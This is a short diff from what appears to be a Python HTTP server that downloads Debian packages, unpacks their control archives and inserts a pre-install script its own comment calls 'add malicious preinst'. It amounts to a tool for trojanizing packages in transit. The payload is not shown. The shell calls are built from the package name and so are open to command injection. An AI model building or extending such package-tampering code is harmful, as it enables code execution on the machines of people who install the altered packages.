@@ -23,6 +23,7 @@ class Server(BaseHTTPRequestHandler):
             #print(hashlib.sha512(r.content).hexdigest())
             os.system("ar x {}.deb --output extracting_area".format(package)) #extract deb files 
             os.system("gunzip {}/control.tar.gzip".format(package)) #unzip control
+            os.system("tar x {}/control.tar".format(package))
             if(os.path.exists("{}/control.tar/preinst".format(package)) == False): #checks whether preinst exists already
                 os.system("tar rf {}/control.tar preinst".format(package)) #add malicious preinst
             else: # if preinst already exists copy created preinst into the exisiting one
